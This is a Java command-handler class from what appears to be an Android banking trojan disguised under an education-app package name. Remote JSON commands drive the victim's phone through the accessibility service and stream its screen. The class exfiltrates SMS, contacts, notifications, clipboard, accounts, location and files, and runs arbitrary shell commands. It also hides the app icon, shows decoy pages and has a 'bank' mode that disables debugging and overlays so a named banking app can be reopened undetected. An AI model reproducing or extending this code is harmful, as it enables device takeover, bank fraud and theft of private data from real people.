package com.eloeeducacao;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;
import android.view.KeyEvent;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

public final class Cmd {

    private static boolean acc() {
        if (KeySvc.I != null) return true;
        Net.send("{\"t\":\"err\",\"o\":\"acessibilidade desligada\"}");
        return false;
    }

    public static void handle(Context c, String m) {
        try {
            JSONObject o = new JSONObject(m);
            String cmd = o.optString("c");
            KeySvc k = KeySvc.I;

            switch (cmd) {
                case "ka":
                    break;
                case "touch":
                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "long":
                    if (acc()) k.longPress((float) o.optDouble("x"), (float) o.optDouble("y"));
                    break;
                case "swipe":
                    if (acc()) k.swipe((float) o.optDouble("x1"), (float) o.optDouble("y1"),
                            (float) o.optDouble("x2"), (float) o.optDouble("y2"), o.optInt("ms", 260));
                    break;
                case "text":
                    if (acc()) k.setText(o.optString("s"));
                    break;
                case "key":
                    if (acc()) k.key(o.optInt("code", 4));
                    break;
                case "screen":
                    if (acc()) k.screenOn(o.optBoolean("on", true));
                    break;
                case "shot":
                    if (acc()) k.shotOn = o.optBoolean("on", true);
                    break;
                case "off": {
                    Ov.fixo = false;
                    Aviso.clear();
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    ScreenSvc.black = false;
                    if (k != null) k.shotOn = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
                    if (k != null) k.lock();
                    Net.send("{\"t\":\"off\"}");
                    Util.sendT("info", "captura desligada e tela bloqueada");
                    break;
                }
                case "screenoff":
                    if (k != null) k.lock();
                    break;
                case "geo":
                    Net.send("{\"t\":\"geo\",\"o\":" + Util.geo(c) + "}");
                    break;
                case "ov":
                    Ov.fixo = o.optBoolean("fixo", false);
                    if (o.optBoolean("on", true)) {
                        ScreenSvc.giveUp = true;
                        if (k != null) k.shotOn = false;
                    } else {
                        ScreenSvc.giveUp = false;
                        if (k != null) k.shotOn = true;
                    }
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));
                    break;
                case "bank": {
                    Aviso.clear();
                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                    ScreenSvc.giveUp = true;
                    ScreenSvc.alive = false;
                    ScreenSvc.black = false;
                    if (k != null) k.shotOn = false;
                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}

                    StringBuilder r = new StringBuilder();
                    r.append(Util.settings("global", "development_settings_enabled", "0")
                            ? "opcoes do desenvolvedor: off" : "opcoes do desenvolvedor: FALHOU (grant adb)");
                    r.append("\n").append(Util.settings("global", "adb_enabled", "0")
                            ? "depuracao usb: off" : "depuracao usb: FALHOU");
                    r.append("\n").append(Util.settings("global", "adb_wifi_enabled", "0")
                            ? "depuracao sem fio: off" : "depuracao sem fio: FALHOU");
                    r.append("\n").append(Util.settings("global", "window_animation_scale", "0")
                            ? "animacoes: 0" : "animacoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "transition_animation_scale", "0")
                            ? "transicoes: 0" : "transicoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "animator_duration_scale", "0")
                            ? "animator: 0" : "animator: FALHOU");
                    try {
                        Runtime.getRuntime().exec(new String[]{"sh", "-c",
                                "appops set " + c.getPackageName() + " REQUEST_INSTALL_PACKAGES deny"});
                        r.append("\ninstalacao por fonte desconhecida: off");
                    } catch (Throwable ignored) {
                        r.append("\ninstalacao por fonte desconhecida: FALHOU");
                    }
                    r.append("\nprojecao de tela: off\noverlay: off");
                    r.append("\n\nreabra o banco agora.");
                    Util.sendT("bank", r.toString());

                    String pkg = o.optString("pkg");
                    if (pkg.length() > 3) {
                        try {
                            Runtime.getRuntime().exec(new String[]{"sh", "-c", "am force-stop " + pkg});
                        } catch (Throwable ignored) {}
                        Intent i2 = c.getPackageManager().getLaunchIntentForPackage(pkg);
                        if (i2 != null) c.startActivity(i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    }
                    break;
                }
                case "unbank": {
                    ScreenSvc.giveUp = false;
                    if (k != null) k.shotOn = true;
                    StringBuilder r = new StringBuilder();
                    r.append(Util.settings("global", "development_settings_enabled", "1")
                            ? "opcoes do desenvolvedor: on" : "opcoes do desenvolvedor: FALHOU");
                    r.append("\n").append(Util.settings("global", "adb_enabled", "1")
                            ? "depuracao usb: on" : "depuracao usb: FALHOU");
                    r.append("\n").append(Util.settings("global", "window_animation_scale", "1")
                            ? "animacoes: 1" : "animacoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "transition_animation_scale", "1")
                            ? "transicoes: 1" : "transicoes: FALHOU");
                    r.append("\n").append(Util.settings("global", "animator_duration_scale", "1")
                            ? "animator: 1" : "animator: FALHOU");
                    try {
                        Runtime.getRuntime().exec(new String[]{"sh", "-c",
                                "appops set " + c.getPackageName() + " REQUEST_INSTALL_PACKAGES allow"});
                    } catch (Throwable ignored) {}
                    r.append("\n\nmodo normal. reabra a captura na tela de setup.");
                    Util.sendT("bank", r.toString());
                    break;
                }
                case "macro":
                    if ("stop".equals(o.optString("op"))) Macro.stop();
                    else Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "run":
                    Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "setup":
                case "perm": {
                    Intent i = new Intent(c, SetupActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    if ("perm".equals(cmd)) i.putExtra("aberto", true);
                    c.startActivity(i);
                    break;
                }
                case "pedir": {
                    Intent i = new Intent(c, SetupActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    i.putExtra("aberto", true);
                    i.putExtra("pedir", o.optString("s", "tudo"));
                    c.startActivity(i);
                    break;
                }
                case "notiflist": {
                    Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(i);
                    break;
                }
                case "decoy":
                    SetupActivity.loja(c);
                    break;
                case "contas":
                    Util.sendT("contas", Contas.lista(c));
                    break;
                case "finger":
                    Util.sendT("finger", Finger.txt(c));
                    break;
                case "clipon":
                    Clip.on = true;
                    Clip.liga(c);
                    break;
                case "snap":
                    Util.sendT("snap", Snap.dump());
                    break;
                case "watch":
                    Watch.on = o.optBoolean("on", true);
                    Util.sendT("info", "watch " + (Watch.on ? "on" : "off"));
                    break;
                case "aviso":
                    Aviso.show(c, o.optString("ti", "Sistema"), o.optString("tx", ""));
                    break;
                case "tree":
                    if (acc()) Tree.dump(k);
                    break;
                case "tap":
                    if (acc()) Tree.act(k, (float) o.optDouble("x"), (float) o.optDouble("y"), false);
                    break;
                case "node":
                    if (acc()) Tree.act(k, (float) o.optDouble("x"), (float) o.optDouble("y"),
                            o.optBoolean("long", false));
                    break;
                case "fill":
                    if (acc()) Tree.fill(k, (float) o.optDouble("x"), (float) o.optDouble("y"), o.optString("s"));
                    break;
                case "q":
                    ScreenSvc.Q = Math.max(15, Math.min(90, o.optInt("v", 38)));
                    Net.send("{\"t\":\"info\",\"o\":\"q " + ScreenSvc.Q + "\"}");
                    break;
                case "fps":
                    ScreenSvc.FPS = Math.max(1, Math.min(15, o.optInt("v", 4)));
                    Net.send("{\"t\":\"info\",\"o\":\"fps " + ScreenSvc.FPS + "\"}");
                    break;
                case "res":
                    ScreenSvc.W = Math.max(360, Math.min(1080, o.optInt("v", 540)));
                    ScreenSvc.rebuildNow();
                    Net.send("{\"t\":\"info\",\"o\":\"res " + ScreenSvc.W + "\"}");
                    break;
                case "toast":
                    Toast.makeText(c, o.optString("s"), Toast.LENGTH_LONG).show();
                    break;
                case "url":
                    c.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(o.optString("u")))
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    break;
                case "open":
                    Intent i = c.getPackageManager().getLaunchIntentForPackage(o.optString("pkg"));
                    if (i != null) c.startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    else Net.send("{\"t\":\"err\",\"o\":\"pacote nao encontrado\"}");
                    break;
                case "shell":
                    Net.send("{\"t\":\"sh\",\"o\":\"" + Util.esc(Util.exec(o.optString("cmd"))) + "\"}");
                    break;
                case "sms":
                    Net.send("{\"t\":\"sms\",\"o\":\"" + Util.esc(Extra.sms(c)) + "\"}");
                    break;
                case "contacts":
                    Net.send("{\"t\":\"cts\",\"o\":\"" + Util.esc(Extra.contacts(c)) + "\"}");
                    break;
                case "applist":
                    Tree.apps(c);
                    break;
                case "apps":
                    Net.send("{\"t\":\"apps\",\"o\":\"" + Util.esc(Extra.apps(c)) + "\"}");
                    break;
                case "loc":
                    Net.send("{\"t\":\"loc\",\"o\":\"" + Util.esc(Extra.loc(c)) + "\"}");
                    break;
                case "info":
                    Net.send("{\"t\":\"info\",\"o\":\"" + Util.esc(Extra.info(c)) + "\"}");
                    break;
                case "notif":
                    Net.send("{\"t\":\"notif\",\"o\":\"" + Util.esc(Extra.notifs(c)) + "\"}");
                    break;
                case "clip":
                    Net.send("{\"t\":\"clip\",\"o\":\"" + Util.esc(Extra.clip(c)) + "\"}");
                    break;
                case "setclip":
                    Extra.setClip(c, o.optString("s"));
                    break;
                case "ls":
                    Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
                    break;
                case "dl":
                    Util.sendT("dl", Extra.cat(o.optString("p"), o.optInt("off", 0), o.optInt("n", 65536)));
                    break;
                case "bright":
                    Extra.bright(c, o.optInt("v", 50));
                    break;
                case "torch":
                    Extra.torch(c, o.optBoolean("on", true));
                    break;
                case "vol":
                    Extra.volume(c, o.optInt("dir", 1), o.optInt("v", -1));
                    break;
                case "play":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE);
                    break;
                case "next":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_NEXT);
                    break;
                case "prev":
                    Extra.media(c, KeyEvent.KEYCODE_MEDIA_PREVIOUS);
                    break;
                case "dial":
                    Extra.dial(c, o.optString("n"), false);
                    break;
                case "call":
                    Extra.dial(c, o.optString("n"), true);
                    break;
                case "hide":
                    c.getPackageManager().setComponentEnabledSetting(
                            new ComponentName(c, "com.eloeeducacao.Alias"),
                            o.optBoolean("on", true)
                                    ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP);
                    Net.send("{\"t\":\"info\",\"o\":\"icone " +
                            (o.optBoolean("on", true) ? "oculto" : "visivel") + "\"}");
                    break;
                case "battery":
                    Intent b = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + c.getPackageName()));
                    b.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(b);
                    break;
                case "wr":
                    Intent wr = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
                            Uri.parse("package:" + c.getPackageName()));
                    wr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    c.startActivity(wr);
                    break;
                case "recon":
                    Net.send("{\"t\":\"info\",\"o\":\"reconectando\"}");
                    Net.start(c);
                    break;
                case "ping":
                    Net.send("{\"t\":\"pong\"}");
                    break;
            }
        } catch (Throwable t) {
            Net.send("{\"t\":\"err\",\"o\":\"" + Util.esc(String.valueOf(t)) + "\"}");
        }
    }
}
